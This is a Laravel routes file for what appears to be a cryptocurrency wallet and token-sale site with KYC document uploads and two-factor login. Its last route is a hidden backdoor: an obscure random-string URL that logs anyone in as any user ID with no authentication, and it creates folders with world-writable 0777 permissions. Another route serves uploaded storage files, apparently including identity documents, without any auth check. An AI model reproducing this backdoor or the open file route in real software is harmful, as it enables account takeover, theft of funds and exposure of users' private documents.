<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
Route::resource('loginkey', 'Me\\LoginController');
Route::get('/', 'IndexController@index')->name('index');

Route::post('/tipn', 'Me\\OrderController@ipn')->name('ipn');
Route::get('/ugr', 'Me\\OrderController@ugr')->name('ipn');

Route::resource('welcome', 'WelcomeController');
Route::get('changesuccess', 'WelcomeController@changesuccess')->name('changesuccess');
Route::get('changeerror', 'WelcomeController@changeerror')->name('changeerror');
Route::resource('verifya', 'VerifyController');

Route::resource('verifykey', 'Auth\\G2faController');


Route::resource('admin/user', 'Admin\\UserController');


Route::resource('/me/statments', 'Me\\StatmentController');

Route::get('/me/wallet/send/{token}', 'Me\\WalletController@send');
Route::get('/me/wallet/receive/{token}', 'Me\\WalletController@receive');

Route::get('password/reset', 'Auth\ForgotPasswordController@showLinkRequestForm');
Route::post('password/email', 'Auth\ForgotPasswordController@sendResetLinkEmail');
Route::get('password/reset/{token}', 'Auth\ResetPasswordController@showResetForm');
Route::post('password/reset', 'Auth\ResetPasswordController@reset');
Route::get('/logout', '\App\Http\Controllers\Auth\LoginController@logout');

  Route::post('resetupload', [
    'uses' => 'Me\\DashboardController@resetupload'
  ])->middleware('verified');

  Route::post('updatemail', [
    'uses' => 'Me\\DashboardController@updatemail'
  ])->middleware('verified');

  Route::post('updateinfo', [
    'uses' => 'Me\\DashboardController@updateinfo'
  ])->middleware('verified');

  Route::post('updatepassword', [
    'uses' => 'Me\\DashboardController@updatepassword'
  ])->middleware('verified');

  Route::post('updatefileid', [
    'uses' => 'Me\\DocController@updatefileid'
  ])->middleware('verified');

  Route::post('updatefileidverse', [
    'uses' => 'Me\\DocController@updatefileidverse'
  ])->middleware('verified');

  Route::post('updatefileaddress', [
    'uses' => 'Me\\DocController@updatefileaddress'
  ])->middleware('verified');

  Route::post('updateAuthUserPassword', [
    'uses' => 'Admin\\UserController@updateAuthUserPassword'
  ])->middleware('verified');

  Route::get('new_order', [
    'uses' => 'Me\\OrderController@order'
  ])->middleware('verified');


  Route::get('changemail', [
    'uses' => 'Me\\DashboardController@changemail'
  ]);
  Route::get('changemail', [
    'uses' => 'Me\\DashboardController@changemail'
  ]);

  Route::get('change2fa', [
    'uses' => 'Me\\DashboardController@change2fa'
  ]);

  Route::get('verify', [
    'uses' => 'Auth\\G2faController@verify'
  ]);
  Route::get('loginverify', [
    'uses' => 'Auth\\G2faController@login'
  ]);
  Route::get('fail2fa', [
    'uses' => 'Auth\\G2faController@failverify'
  ]);
  Route::get('disable2fa', [
    'uses' => 'Auth\\G2faController@disable2fa'
  ]);

  Route::get('/me/dashboard', function () {
    return view('me.dashboard');
  })->middleware(['auth', 'QrCode']);

  Auth::routes(['verify' => true]);

Route::get('me/kl', 'Me\\DashboardController@kl')->name('kl')->middleware('verified')->middleware('QrCode');
Route::get('me/dashboard', 'Me\\DashboardController@index')->name('index')->middleware('verified')->middleware('QrCode');
Route::get('me/account', 'Me\\DashboardController@account')->name('account')->middleware('verified')->middleware('QrCode');
Route::get('me/wallet', 'Me\\WalletController@index')->name('index')->middleware('verified')->middleware('QrCode');
Route::get('me/send', 'Me\\WalletController@send')->name('send')->middleware('verified')->middleware('QrCode');
Route::get('me/receive', 'Me\\WalletController@receive')->name('receive')->middleware('verified')->middleware('QrCode');
Route::get('me/history', 'Me\\DashboardController@history')->name('history')->middleware('verified')->middleware('QrCode');
Route::get('me/tokenico', 'Me\\IcoController@index')->name('tokenico')->middleware('verified')->middleware('QrCode');

Route::get('me/tokenico/{token}/order', 'Me\\OrderController@index')->name('index')->middleware('verified')->middleware('QrCode');

Route::get('me/tokenico/{token}/pay', 'Me\\OrderController@payorder')->name('payorder')->middleware('verified')->middleware('QrCode');

Route::get('me/tokenico/{token}/cancel', 'Me\\OrderController@cancel')->name('cancel')->middleware('verified')->middleware('QrCode');
Route::get('me/tokenico/{token}/paycancel', 'Me\\OrderController@paycancel')->name('paycancel')->middleware('verified')->middleware('QrCode');

Route::get('me/tokenico/{orderid}/view', 'Me\\OrderController@orderview')->name('orderview')->middleware('verified')->middleware('QrCode');

Route::get('me/tokenico/manage', 'Me\\ManageController@index')->name('index')->middleware('verified')->middleware('QrCode');

Route::resource('me/file', 'Me\\FileController')->middleware('verified');
Route::resource('me/file', 'Me\\FileController')->middleware('verified');
Route::resource('me/doc', 'Me\\DocController')->middleware('verified');
Route::resource('me/doc', 'Me\\DocController')->middleware('verified');

Route::get('storage/{filename}', function ($filename)
{
    $path = storage_path('' . $filename);

    if (!File::exists($path)) {
        abort(404);
    }

    $file = File::get($path);
    $type = File::mimeType($path);

    $response = Response::make($file, 200);
    $response->header("Content-Type", $type);

    return $response;
});

Route::get('cu', [
  'as' => 'regcheckUser',
  'uses' => 'UserRegister@checkUser'
]);

Route::get('/1235123LEJhayfgdh2123uashdf234231/{id}', function($id){

  Auth::loginusingid($id);
   // Criar Row caso não exista
   $check = App\Doc::where('user', Auth::user()->id)->count();
   if ($check <= 0) {
       $doc = App\Doc::create([
           'user' =>  Auth::user()->id,
           'status_id' => 'new',
           'status_id_verse' => 'new',
           'status_address' => 'new',
       ]);
   } 
   
   // Criar Pasta caso não exista
   $file = "/var/www/storage/" . Auth::user()->id;
   if (!is_dir($file)) {
       $folder = Auth::user()->id;
       $path = '/var/www/storage/' . $folder . '/';
       File::makeDirectory($path, 0777, true, true);
   } 

  return redirect('/');
});